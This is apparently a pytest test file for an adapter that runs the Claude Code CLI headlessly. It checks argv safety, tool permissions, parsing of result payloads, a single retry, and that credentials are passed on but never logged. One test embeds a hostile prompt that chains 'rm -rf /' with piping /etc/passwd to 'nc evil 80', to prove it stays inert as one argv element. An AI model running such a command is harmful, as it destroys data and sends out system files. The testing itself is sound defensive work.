"""T-0034: failing tests for the Claude Code headless adapter.

The symbols imported below do not exist yet, so this module fails at
COLLECTION with ``ImportError``. That is the correct red state.

**No test here invokes a real agent CLI** (§10.4, and the graph node's own
note). Every case runs against recorded payloads under
``tests/fixtures/claude_payloads/`` with ``subprocess.Popen`` replaced. A
suite that shelled out to ``claude`` would need a credential, would cost
money, and would stop working the moment someone else cloned the repository.

Those payloads are **synthetic** — constructed from §6.2's documented shape
because no CLI was installed when they were written. Their README says so, and
it matters: they are evidence about the *contract*, not about any installed
release.

This is the first module in the project that is an integration boundary rather
than a deterministic component, and §6.4's parsing rules all exist because of
a specific way integrations lie to you:

* **Exit code 0 does not mean success.** A failure inside the run is printed
  as the *result on stdout*. Branching on the exit code alone reports a failed
  turn as a completed one.
* **A specific non-zero code means nothing.** There is no published global
  exit-code table, so asserting ``== 1`` bakes in a number nobody promised.
* **A missing structured result is a *parse* failure, not a task failure.**
  Charging the task's attempt budget for the adapter's problem is how a
  perfectly good agent gets escalated.
* **Raw output is persisted before parsing.** When parsing fails you need the
  bytes, and by then the process is gone.

And one rule that is unique to this module: the agent subprocess receives the
**full environment**, because it has to authenticate. That is the opposite of
the harness in §7.3, which is scrubbed precisely so a malicious test cannot
read a credential. Two subprocess paths, two rules, two different threats.
"""

from __future__ import annotations

import json
import os
import subprocess
from pathlib import Path
from typing import Any

import pytest
from redgear.errors import RunnerError
from redgear.runner import (
    FORBIDDEN_FLAGS,
    ClaudeCodeConfig,
    ClaudeCodeRunner,
    allowed_tools_for,
    bash_rule,
)
from redgear.schemas import TaskNode, TurnOutcome, TurnResult

PAYLOADS = Path(__file__).parent / "fixtures" / "claude_payloads"

#: Long enough that redaction's MIN_SECRET_LENGTH applies, and obviously fake.
FAKE_KEY = "NOT-A-REAL-ANTHROPIC-KEY-000001"


def _payload(name: str) -> str:
    return (PAYLOADS / f"{name}.json").read_text(encoding="utf-8")


def _task(*, writable: list[str] | None = None, task_type: str = "implementation") -> TaskNode:
    globs = writable if writable is not None else ["src/ledger/**"]
    payload: dict[str, Any] = {
        "id": "T-0042",
        "type": task_type,
        "title": "Implement the ledger posting rules",
        "state": "claimed",
        "spec_refs": ["FR-5"],
        "spec_hash": "sha256:" + "d" * 64,
        "depends_on": [],
        "scope": {
            "writable_globs": globs,
            "creatable_globs": globs,
            "frozen_globs": ["tests/**"],
        },
        "acceptance_criteria": [],
        "inherits_criteria_from": ["T-0041"] if task_type == "implementation" else [],
        "attempts": 0,
        "max_attempts": 3,
        "claim": None,
        "prior_attempts": [],
        "verified_at": None,
        "proof_id": None,
        "escalation": None,
    }
    return TaskNode.model_validate(payload)


class FakeProcess:
    """Stands in for a spawned ``claude``. Never runs anything."""

    def __init__(self, stdout: str, stderr: str = "", returncode: int = 0) -> None:
        self._stdout = stdout
        self._stderr = stderr
        self.returncode = returncode
        self.pid = 4242
        self.killed = False

    def communicate(self, timeout: float | None = None) -> tuple[str, str]:
        return self._stdout, self._stderr

    def poll(self) -> int | None:
        return self.returncode

    def kill(self) -> None:  # pragma: no cover - exercised via terminate paths
        self.killed = True

    def terminate(self) -> None:  # pragma: no cover
        self.killed = True

    def wait(self, timeout: float | None = None) -> int:  # pragma: no cover
        return self.returncode


class SpawnSpy:
    """Captures every spawn: argv, cwd, and the environment handed over."""

    def __init__(self, *responses: FakeProcess) -> None:
        self.responses = list(responses)
        self.argvs: list[list[str]] = []
        self.envs: list[dict[str, str]] = []
        self.cwds: list[Any] = []
        #: What existed on disk at the moment of each spawn, so AC-7's
        #: ordering can be checked from inside rather than after the fact.
        self.calls = 0

    def __call__(self, argv: list[str], **kwargs: Any) -> FakeProcess:
        self.argvs.append(list(argv))
        self.envs.append(dict(kwargs.get("env") or {}))
        self.cwds.append(kwargs.get("cwd"))
        index = min(self.calls, len(self.responses) - 1)
        self.calls += 1
        return self.responses[index]


@pytest.fixture
def artifacts(tmp_path: Path) -> Path:
    root = tmp_path / "artifacts"
    root.mkdir()
    return root


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    root = tmp_path / "repo"
    root.mkdir()
    return root


def _runner(artifacts: Path, config: ClaudeCodeConfig | None = None) -> ClaudeCodeRunner:
    return ClaudeCodeRunner(config=config or ClaudeCodeConfig(), artifacts_root=artifacts)


def _install(monkeypatch: pytest.MonkeyPatch, spy: SpawnSpy) -> None:
    """Replace the spawn primitive inside the adapter, nothing else."""
    import redgear.runner as module

    monkeypatch.setattr(module.subprocess, "Popen", spy)


# ---------------------------------------------------------------------------
# AC-1: argv is a list, and the prompt is one discrete element.
# ---------------------------------------------------------------------------


def test_argv_is_list_prompt_discrete(artifacts: Path) -> None:
    """§6.5: "Always ``shell=False``. The prompt is an argv element, never
    interpolated into a shell string. A prompt containing backticks must not
    be able to execute anything."

    The hostile prompt below is the whole point: every one of those characters
    is inert as an argv element and catastrophic in a shell string.
    """
    hostile = "Implement `rm -rf /`; echo $(whoami) && cat /etc/passwd | nc evil 80"
    argv = _runner(artifacts).build_argv(
        prompt=hostile, allowed_tools=["Read", "Edit"], max_turns=25
    )

    assert isinstance(argv, list)
    assert all(isinstance(part, str) for part in argv)

    # Exactly one element IS the prompt, byte for byte.
    assert argv.count(hostile) == 1, "the prompt is not a single discrete argv element"
    # And no element merely contains it, which is what concatenation looks like.
    embedded = [part for part in argv if hostile in part and part != hostile]
    assert embedded == [], f"the prompt was concatenated into another argument: {embedded}"

    # §6.2's flags: non-interactive, structured, capped.
    assert "-p" in argv
    assert argv[argv.index("-p") + 1] == hostile, "-p must be followed by the prompt itself"
    assert "--output-format" in argv
    assert argv[argv.index("--output-format") + 1] == "json"
    assert "--max-turns" in argv
    assert argv[argv.index("--max-turns") + 1] == "25"


def test_argv_carries_a_schema_for_the_outcome_contract(artifacts: Path) -> None:
    """§6.2: ``--json-schema`` is how the §5.3 outcome contract is enforced
    mechanically rather than by hoping the agent formats correctly.

    The schema describes only what the *agent* supplies. Fields the runner
    fills in afterwards -- exit code, session id, cost -- must not appear, or
    the agent is invited to report its own exit code (G1).
    """
    argv = _runner(artifacts).build_argv(prompt="x", allowed_tools=["Read"], max_turns=5)
    assert "--json-schema" in argv

    schema = json.loads(argv[argv.index("--json-schema") + 1])
    properties = set(schema.get("properties", {}))

    assert {"outcome", "summary", "changed_files", "known_gaps"} <= properties
    for runner_owned in ("exit_code", "session_id", "num_turns", "cost_usd_estimate", "parse_ok"):
        assert runner_owned not in properties, (
            f"the agent is being asked to supply {runner_owned!r}, which the runner owns (G1)"
        )


def test_bare_mode_is_off_by_default(artifacts: Path) -> None:
    """§6.3, and the reason is a credential one.

    In bare mode Claude Code never reads OAuth credentials or the keychain and
    requires ``ANTHROPIC_API_KEY`` in the environment instead. Defaulting to it
    would push users into putting a raw key in their shell for a tool that
    otherwise needs no credential at all -- trading away the cleanest property
    redgear has (G5).
    """
    assert ClaudeCodeConfig().bare is False
    assert "--bare" not in _runner(artifacts).build_argv(
        prompt="x", allowed_tools=["Read"], max_turns=5
    )

    opted_in = _runner(artifacts, ClaudeCodeConfig(bare=True)).build_argv(
        prompt="x", allowed_tools=["Read"], max_turns=5
    )
    assert "--bare" in opted_in, "the documented opt-in does not work"


# ---------------------------------------------------------------------------
# AC-2: permission strings, and the significant space.
# ---------------------------------------------------------------------------


def test_permission_string_spacing() -> None:
    """§6.2: "``Bash(git diff *)`` -- **the space before ``*`` is
    significant**; without it the pattern also matches ``git diff-index``."

    That is a genuine privilege escalation, not a formatting nit: an agent
    granted ``git diff`` would silently also be granted every command sharing
    that prefix.
    """
    assert bash_rule("git diff") == "Bash(git diff *)"
    assert bash_rule("git status") == "Bash(git status *)"

    # The failure mode, named explicitly.
    assert bash_rule("git diff") != "Bash(git diff*)", (
        "the space before * is missing, so this rule also matches git diff-index"
    )
    assert bash_rule("git diff").endswith(" *)")

    # A caller that already included the wildcard must not get a doubled one.
    assert bash_rule("git diff *") == "Bash(git diff *)"
    assert bash_rule("  git diff  ") == "Bash(git diff *)"


def test_permissions_never_include_a_bare_shell(artifacts: Path) -> None:
    """§8.2: "Never bare ``Bash``." An unrestricted shell defeats every scope
    guarantee at once, because the agent can write any file with it."""
    for prefixes in ([], ["git status"], ["git diff", "git log"]):
        config = ClaudeCodeConfig(bash_prefixes=prefixes)
        tools = _runner(artifacts, config).tools_for(_task())
        assert "Bash" not in tools, f"a bare shell was granted: {tools}"
        for entry in tools:
            if entry.startswith("Bash"):
                assert entry.startswith("Bash(") and entry.endswith(" *)"), entry


def test_permissions_are_derived_from_task_scope(artifacts: Path) -> None:
    """A read-only task gets no write tools; a writing task does."""
    writing = _runner(artifacts).tools_for(_task())
    assert {"Read", "Glob", "Grep", "Edit", "Write"} <= set(writing)

    assert set(allowed_tools_for(_task())) <= set(writing)


# ---------------------------------------------------------------------------
# AC-3: the permission-skipping flag is unreachable.
# ---------------------------------------------------------------------------


def test_skip_permissions_unreachable(artifacts: Path) -> None:
    """§11.1 rule 3: "Never pass ``--dangerously-skip-permissions`` or add a
    config option that enables it."

    "Unreachable" is a stronger claim than "unused", so all three are checked:
    no config field can carry it, no combination of config produces it, and
    the string does not appear in the module at all except where it is named
    as forbidden.
    """
    assert "--dangerously-skip-permissions" in FORBIDDEN_FLAGS

    # 1. No config field accepts arbitrary argv. An `extra_args` escape hatch
    #    is exactly how this flag would come back.
    for field in ClaudeCodeConfig.model_fields:
        assert field not in {"extra_args", "args", "flags", "argv", "raw_args"}, (
            f"ClaudeCodeConfig.{field} is an arbitrary-argv hatch; the forbidden "
            "flag becomes reachable through it"
        )

    # 2. Pydantic rejects unknown fields, so it cannot be smuggled in.
    with pytest.raises(Exception, match=r"(?i)extra|forbidden|unexpected"):
        ClaudeCodeConfig.model_validate({"extra_args": ["--dangerously-skip-permissions"]})

    # 3. No combination of the real config produces it.
    for bare in (True, False):
        for prefixes in ([], ["git status"]):
            for mcp in (None, "mcp.json"):
                argv = _runner(
                    artifacts,
                    ClaudeCodeConfig(bare=bare, bash_prefixes=prefixes, mcp_config=mcp),
                ).build_argv(prompt="x", allowed_tools=["Read"], max_turns=5)
                for flag in FORBIDDEN_FLAGS:
                    assert flag not in argv, f"{flag} appeared with bare={bare} mcp={mcp}"


def test_a_forbidden_flag_supplied_as_a_tool_is_rejected(artifacts: Path) -> None:
    """The last door: the flag arriving through ``allowed_tools`` and landing
    in the permission string."""
    with pytest.raises(RunnerError):
        _runner(artifacts).build_argv(
            prompt="x",
            allowed_tools=["Read", "--dangerously-skip-permissions"],
            max_turns=5,
        )


# ---------------------------------------------------------------------------
# AC-4 / AC-5: exit codes prove nothing.
# ---------------------------------------------------------------------------


def test_failure_on_stdout_with_zero_exit(
    artifacts: Path, repo: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """§6.4 rule 1: "Exit code 0 does not mean success. A failure inside the
    run is printed as the *result on stdout*."

    The payload here is an ``error_max_turns`` result delivered with exit 0.
    An adapter that trusted the exit code would report this as a completed
    turn, and the orchestrator would verify work that was never finished.
    """
    spy = SpawnSpy(FakeProcess(_payload("error_zero_exit"), returncode=0))
    _install(monkeypatch, spy)

    with pytest.raises(RunnerError) as excinfo:
        _runner(artifacts).dispatch("prompt", ["Read"], repo, 900, 25)

    assert excinfo.value.code == "E_RUNNER_ERROR"
    detail = str(excinfo.value.detail)
    assert "error_max_turns" in detail or "is_error" in detail, (
        f"the failure reason from the payload was not surfaced: {detail}"
    )


def test_no_specific_exit_code_assertions(
    artifacts: Path, repo: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """§6.4 rule 2: "Do not assert specific non-zero exit codes. There is no
    published global exit-code table."

    The same good payload is returned with wildly different exit codes. The
    parsed result must be identical apart from the recorded code itself --
    which is stored as data, never branched on. 143 is SIGTERM and is included
    on purpose, because it is the one people hard-code.
    """
    results = []
    for code in (0, 1, 2, 7, 143):
        spy = SpawnSpy(FakeProcess(_payload("completed"), returncode=code))
        _install(monkeypatch, spy)
        result = _runner(artifacts).dispatch("prompt", ["Read"], repo, 900, 25)
        results.append(result)
        assert result.exit_code == code, "the exit code must be recorded verbatim"

    outcomes = {result.outcome for result in results}
    summaries = {result.summary for result in results}
    declared = {tuple(result.changed_files) for result in results}
    assert outcomes == {TurnOutcome.COMPLETED}, (
        f"the verdict changed with the exit code: {outcomes}"
    )
    assert len(summaries) == 1 and len(declared) == 1, (
        "parsing branched on the exit code; the payload is the only source of truth"
    )


def test_a_blocked_payload_parses_as_blocked(
    artifacts: Path, repo: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """G3: an honest exit has to survive the adapter intact, category and all,
    or the orchestrator cannot tell it apart from a failure."""
    _install(monkeypatch, SpawnSpy(FakeProcess(_payload("blocked"))))
    result = _runner(artifacts).dispatch("prompt", ["Read"], repo, 900, 25)

    assert result.outcome is TurnOutcome.BLOCKED
    assert result.blocker_category is not None
    assert result.blocker_detail
    assert result.parse_ok is True


def test_changed_files_are_recorded_as_a_claim(
    artifacts: Path, repo: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """G1: "``changed_files`` from the agent is a claim." The adapter records
    it verbatim and does nothing with it -- the scope gate cross-checks it
    against the real diff."""
    _install(monkeypatch, SpawnSpy(FakeProcess(_payload("completed"))))
    result = _runner(artifacts).dispatch("prompt", ["Read"], repo, 900, 25)

    assert result.changed_files == ["src/ledger/posting.py", "src/ledger/__init__.py"]
    assert result.session_id
    assert result.num_turns == 7
    assert result.cost_usd_estimate == pytest.approx(0.0412)


# ---------------------------------------------------------------------------
# Manual verification findings (real Claude Code 2.1.229, Windows, 2026-08-19).
# See tests/fixtures/claude_payloads/README.md for the full account and the
# three verbatim captures these tests are pinned against.
# ---------------------------------------------------------------------------


def test_subtype_is_never_a_success_signal(
    artifacts: Path, repo: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """``real_unauthenticated_failure.json`` (== ``error_zero_exit.json``) has
    ``"subtype": "success"`` despite being a hard authentication failure --
    observed in all three real captures, including this one. ``subtype`` is
    useless as a discriminator; ``is_error`` is the real one, and it is what
    ``_parse`` already branches on.

    Two things are asserted: the adapter genuinely treats this payload as a
    failure (behavioural proof), and the module's source never references
    ``subtype`` at all (structural proof it cannot have been fooled by it --
    the same pattern ``test_the_module_never_reads_an_auth_variable`` uses).
    """
    raw = json.loads(_payload("error_zero_exit"))
    assert raw["subtype"] == "success", "fixture drifted from the real capture it stands in for"
    assert raw["is_error"] is True

    _install(monkeypatch, SpawnSpy(FakeProcess(_payload("error_zero_exit"), returncode=0)))
    with pytest.raises(RunnerError):
        _runner(artifacts).dispatch("prompt", ["Read"], repo, 900, 25)

    import redgear.runner as module

    source = Path(str(module.__file__)).read_text(encoding="utf-8")
    assert "subtype" not in source, (
        "the adapter now reads subtype, which real payloads prove is not a reliable signal "
        '-- it reads "success" even on a hard failure'
    )


def test_structured_output_is_a_real_object_distinct_from_result_string(artifacts: Path) -> None:
    """``real_json_schema_dispatch.json``: ``structured_output`` is a JSON
    object; ``result`` carries the *same content* JSON-encoded as a string.
    The adapter has always read ``structured_output`` directly and never
    fallen back to parsing ``result`` -- this pins that down against the real
    shape rather than only against the synthetic one.

    This capture used a minimal test schema (``{"outcome": {"type":
    "string"}}``), not redgear's own ``agent_report_schema()``, so its
    ``structured_output.outcome`` is free text and will not validate against
    ``AgentTurnReport``. That is expected -- it is checked at the raw JSON
    level here rather than routed through ``ClaudeCodeRunner._parse``, which
    correctly rejects it (see the next test).
    """
    raw = json.loads(_payload("real_json_schema_dispatch"))

    assert isinstance(raw["structured_output"], dict)
    assert isinstance(raw["result"], str)
    # Same content, two shapes: result is structured_output JSON-encoded.
    assert json.loads(raw["result"]) == raw["structured_output"]

    import redgear.runner as module

    source = Path(str(module.__file__)).read_text(encoding="utf-8")
    assert '"result"' not in source and 'get("result")' not in source, (
        "the adapter reads payload['result'] somewhere; G1's outcome contract is meant to "
        "come from structured_output only"
    )


def test_a_real_json_schema_payload_not_matching_our_schema_fails_to_parse(
    artifacts: Path, repo: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The other half of the previous test: a real, well-formed
    ``structured_output`` that does not conform to redgear's own
    ``AgentTurnReport`` schema is correctly treated as unparseable, not
    smuggled through. Proves the adapter validates the *shape* redgear needs,
    not merely that some object is present."""
    _install(
        monkeypatch,
        SpawnSpy(FakeProcess(_payload("real_json_schema_dispatch"), returncode=0)),
    )
    with pytest.raises(RunnerError):
        _runner(artifacts).dispatch("prompt", ["Read"], repo, 900, 25)


def test_stop_reason_tool_use_does_not_cause_failure(
    artifacts: Path, repo: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """``real_json_schema_dispatch.json`` showed a normal, successful,
    4-turn dispatch stopping with ``stop_reason: "tool_use"`` (the agent read
    a file before answering) -- every real dispatch that uses a tool will
    look like this. ``completed.json`` now carries that same observed
    ``stop_reason`` so the fact stays true under test rather than only under
    one-off inspection: any logic treating ``stop_reason != "end_turn"`` as
    failure would reject every real dispatch.
    """
    raw = json.loads(_payload("completed"))
    assert raw["stop_reason"] == "tool_use"
    assert raw["num_turns"] > 1

    _install(monkeypatch, SpawnSpy(FakeProcess(_payload("completed"))))
    result = _runner(artifacts).dispatch("prompt", ["Read"], repo, 900, 25)

    assert result.outcome is TurnOutcome.COMPLETED
    assert result.parse_ok is True

    import redgear.runner as module

    source = Path(str(module.__file__)).read_text(encoding="utf-8")
    assert "stop_reason" not in source, (
        "the adapter now branches on stop_reason; real payloads prove tool_use is normal "
        "on a successful dispatch"
    )


def test_permission_denials_are_observed_but_not_yet_surfaced() -> None:
    """All three real captures carry ``permission_denials: []`` -- empty in
    every sample, because none of the three manual dispatches attempted a
    disallowed tool. This does not prove the field is never populated; it
    proves the adapter has never had a non-empty sample to react to.

    Documented rather than fixed: ``TurnResult`` has no field for a denial
    today, so one occurring is currently invisible to the orchestrator. See
    ``docs/PROGRESS.md`` §5 for the open question of whether that should
    change -- this test only pins down the current, honest state of affairs
    so a future change here is a deliberate edit, not a silent one.
    """
    for name in ("real_unauthenticated_failure", "real_plain_success", "real_json_schema_dispatch"):
        raw = json.loads(_payload(name))
        assert raw["permission_denials"] == []

    assert "permission_denials" not in TurnResult.model_fields


# ---------------------------------------------------------------------------
# AC-6: exactly one reminder retry.
# ---------------------------------------------------------------------------


def test_single_reminder_retry(
    artifacts: Path, repo: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """§6.4 rule 4: "Retry the dispatch once with an appended reminder of the
    required shape. Two consecutive parse failures end the run with
    ``runner_error`` -- that is an integration bug and must be loud, not
    silently retried forever."

    Exactly two spawns. Not one (no retry at all), not three (a retry loop
    that burns money on a broken integration).
    """
    spy = SpawnSpy(FakeProcess(_payload("no_structured_output")))
    _install(monkeypatch, spy)

    with pytest.raises(RunnerError) as excinfo:
        _runner(artifacts).dispatch("original prompt", ["Read"], repo, 900, 25)

    assert excinfo.value.code == "E_RUNNER_ERROR"
    assert spy.calls == 2, f"expected exactly one retry, saw {spy.calls} dispatch(es)"

    first, second = spy.argvs[0], spy.argvs[1]
    first_prompt = first[first.index("-p") + 1]
    second_prompt = second[second.index("-p") + 1]

    assert first_prompt == "original prompt"
    assert second_prompt != first_prompt, "the retry sent an identical prompt"
    assert first_prompt in second_prompt, "the retry dropped the original task"
    assert "structured" in second_prompt.lower() or "json" in second_prompt.lower(), (
        f"the retry carries no reminder of the required shape: {second_prompt!r}"
    )


def test_retry_that_succeeds_is_not_an_error(
    artifacts: Path, repo: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """One malformed result is recoverable; only a second consecutive one
    means the integration is broken."""
    spy = SpawnSpy(
        FakeProcess(_payload("no_structured_output")),
        FakeProcess(_payload("completed")),
    )
    _install(monkeypatch, spy)

    result = _runner(artifacts).dispatch("prompt", ["Read"], repo, 900, 25)

    assert spy.calls == 2
    assert result.outcome is TurnOutcome.COMPLETED
    assert result.parse_ok is True


def test_unparseable_stdout_is_also_a_parse_failure(
    artifacts: Path, repo: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Not JSON at all -- a crash banner, a proxy error page, an empty
    stream. Same class of fault, same handling."""
    spy = SpawnSpy(FakeProcess("<html>502 Bad Gateway</html>"))
    _install(monkeypatch, spy)

    with pytest.raises(RunnerError):
        _runner(artifacts).dispatch("prompt", ["Read"], repo, 900, 25)
    assert spy.calls == 2


# ---------------------------------------------------------------------------
# AC-7: raw streams hit disk before parsing.
# ---------------------------------------------------------------------------


def test_raw_persisted_before_parse(
    artifacts: Path, repo: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """§6.4 rule 6: "Always persist raw stdout and stderr before parsing. When
    parsing fails you need the bytes."

    Asserted through the failure path on purpose: if persistence happened
    after a successful parse, this is exactly the case where the evidence
    would be missing -- and it is the only case where anyone needs it.
    """
    spy = SpawnSpy(FakeProcess("<html>502 Bad Gateway</html>", stderr="progress: connecting"))
    _install(monkeypatch, spy)

    with pytest.raises(RunnerError):
        _runner(artifacts).dispatch("prompt", ["Read"], repo, 900, 25)

    stdout_files = sorted(artifacts.rglob("agent_stdout.log"))
    stderr_files = sorted(artifacts.rglob("agent_stderr.log"))
    assert stdout_files, "raw stdout was not persisted for a turn that failed to parse"
    assert stderr_files, "raw stderr was not persisted"

    assert "502 Bad Gateway" in stdout_files[0].read_text(encoding="utf-8")
    assert "progress: connecting" in stderr_files[0].read_text(encoding="utf-8")

    # Both dispatches are kept, not just the last -- the first is the one that
    # shows what actually went wrong.
    assert len(stdout_files) == 2, f"only {len(stdout_files)} turn(s) archived"


def test_raw_path_is_recorded_on_the_result(
    artifacts: Path, repo: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _install(monkeypatch, SpawnSpy(FakeProcess(_payload("completed"), stderr="noise")))
    result = _runner(artifacts).dispatch("prompt", ["Read"], repo, 900, 25)

    assert result.raw_stdout_path
    assert Path(result.raw_stdout_path).is_file()


# ---------------------------------------------------------------------------
# AC-8: the environment is propagated, never inspected.
# ---------------------------------------------------------------------------


def test_env_propagated_never_inspected(
    artifacts: Path, repo: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """G5, and the one place in redgear where a credential legitimately
    crosses a boundary.

    The child **needs** the full environment: without it Claude Code cannot
    authenticate at all. So propagation is required. What is forbidden is
    redgear *reading* it -- "Never read, log, store, print, or branch on the
    value of an auth environment variable. Propagation is not reading."

    Both halves are asserted, because either alone is satisfiable by a broken
    implementation: an adapter that scrubbed the env would pass the "not
    logged" half while breaking authentication.
    """
    monkeypatch.setenv("ANTHROPIC_API_KEY", FAKE_KEY)
    monkeypatch.setenv("PATH", os.environ.get("PATH", ""))

    spy = SpawnSpy(FakeProcess(_payload("completed"), stderr="progress"))
    _install(monkeypatch, spy)

    runner = _runner(artifacts)
    result = runner.dispatch("prompt", ["Read"], repo, 900, 25)

    # Propagated: the child can authenticate.
    assert spy.envs, "no environment was passed to the child at all"
    assert spy.envs[0].get("ANTHROPIC_API_KEY") == FAKE_KEY, (
        "the credential was scrubbed; the agent CLI would fail to authenticate"
    )

    # Never written down. Everything this turn put on disk, checked.
    for path in artifacts.rglob("*"):
        if path.is_file():
            assert FAKE_KEY not in path.read_text(encoding="utf-8", errors="replace"), (
                f"a credential value was written to {path}"
            )

    # Not in the argv record, and not on the result.
    for argv in spy.argvs:
        assert all(FAKE_KEY not in part for part in argv)
    assert FAKE_KEY not in result.model_dump_json()


def test_argv_record_redacts_credential_values(
    artifacts: Path, repo: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """FR-5: "The exact argv is persisted for every dispatch with credential
    values redacted." Section 8.2 wants the allowlist auditable -- a run where
    you cannot see what the agent was permitted to do is not auditable."""
    monkeypatch.setenv("ANTHROPIC_API_KEY", FAKE_KEY)
    _install(monkeypatch, SpawnSpy(FakeProcess(_payload("completed"))))

    _runner(artifacts).dispatch("prompt", ["Read", "Edit"], repo, 900, 25)

    records = sorted(artifacts.rglob("argv.json"))
    assert records, "the argv was not persisted"
    text = records[0].read_text(encoding="utf-8")
    assert FAKE_KEY not in text

    record = json.loads(text)
    assert "Read,Edit" in json.dumps(record) or "Read" in json.dumps(record)
    # §2.3: "argv.json — exact argv, env keys only (values redacted)".
    assert "ANTHROPIC_API_KEY" not in json.dumps(record.get("argv", []))


def test_the_module_never_reads_an_auth_variable() -> None:
    """§10.3 greps for this in CI; asserting it here means a violation fails
    the suite rather than only the pipeline."""
    import redgear.runner as module

    source = Path(str(module.__file__)).read_text(encoding="utf-8")
    for name in ("ANTHROPIC_API_KEY", "OPENAI_API_KEY", "GEMINI_API_KEY"):
        for accessor in (f'environ["{name}"]', f'environ.get("{name}")', f'getenv("{name}")'):
            assert accessor not in source, f"the adapter reads {name}"


# ---------------------------------------------------------------------------
# Process hygiene -- §6.5.
# ---------------------------------------------------------------------------


def test_timeout_kills_the_tree_and_returns_a_result(
    artifacts: Path, repo: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """§6.5: on expiry, terminate the process **tree** -- not just the direct
    child -- record a timeout, and count it as a failed attempt.

    Never an escaping exception: one slow turn must not abort the run and lose
    the proof along with it.
    """
    killed: list[Any] = []

    class TimingOutProcess(FakeProcess):
        def communicate(self, timeout: float | None = None) -> tuple[str, str]:
            if timeout is not None:
                raise subprocess.TimeoutExpired(cmd="claude", timeout=timeout)
            return "", ""

    import redgear.runner as module

    monkeypatch.setattr(module, "terminate_process_tree", lambda proc: killed.append(proc))
    _install(monkeypatch, SpawnSpy(TimingOutProcess("")))

    result = _runner(artifacts).dispatch("prompt", ["Read"], repo, 1, 25)

    assert killed, "the process tree was not terminated on timeout"
    assert result.parse_ok is False
    assert result.outcome is TurnOutcome.COMPLETED
    assert "timeout" in (result.blocker_detail or "").lower() or "timeout" in result.summary.lower()


def test_shell_is_never_enabled(
    artifacts: Path, repo: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """§11.1 rule 1. Asserted at the spawn site, where it would actually
    matter."""
    captured: dict[str, Any] = {}

    class Recorder(SpawnSpy):
        def __call__(self, argv: list[str], **kwargs: Any) -> FakeProcess:
            captured.update(kwargs)
            return super().__call__(argv, **kwargs)

    _install(monkeypatch, Recorder(FakeProcess(_payload("completed"))))
    _runner(artifacts).dispatch("prompt", ["Read"], repo, 900, 25)

    assert captured.get("shell", False) is False
    assert captured.get("cwd") == repo


def test_version_reports_something(artifacts: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """`redgear doctor` surfaces this so adapter drift is diagnosable rather
    than mysterious (§2.4). A missing CLI is reported, not raised."""
    import redgear.runner as module

    monkeypatch.setattr(
        module.subprocess,
        "run",
        lambda *a, **k: subprocess.CompletedProcess(a[0] if a else [], 0, "1.2.3\n", ""),
    )
    assert "1.2.3" in _runner(artifacts).version()


def test_the_adapter_satisfies_the_runner_protocol(artifacts: Path) -> None:
    """NFR-8: the orchestrator is typed against the protocol, so the real
    adapter and the fake must be interchangeable at the seam."""
    from redgear.runner import Runner

    assert isinstance(_runner(artifacts), Runner)
